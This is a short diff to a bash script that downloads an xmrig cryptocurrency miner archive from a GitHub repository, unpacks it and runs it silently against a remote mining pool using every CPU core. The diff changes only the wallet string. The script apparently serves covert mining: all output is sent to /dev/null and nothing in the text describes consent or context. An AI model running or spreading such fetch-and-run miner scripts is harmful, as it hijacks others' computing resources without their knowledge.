@@ -1,6 +1,6 @@
 #!/bin/bash
 A=167.71.200.23:443
-B=solo:SaLvs6xH5qeV5j4DTgCFCmdE9Sgix5QcJfravWBbsgDJDGJ9YqgMcLxFALARL4eoN5JEjds8GcjPnXRfKFruYGeRNyDKdhsm3dC
+B=SaLvs6xH5qeV5j4DTgCFCmdE9Sgix5QcJfravWBbsgDJDGJ9YqgMcLxFALARL4eoN5JEjds8GcjPnXRfKFruYGeRNyDKdhsm3dC
 C=CAPLOK
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
 ./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
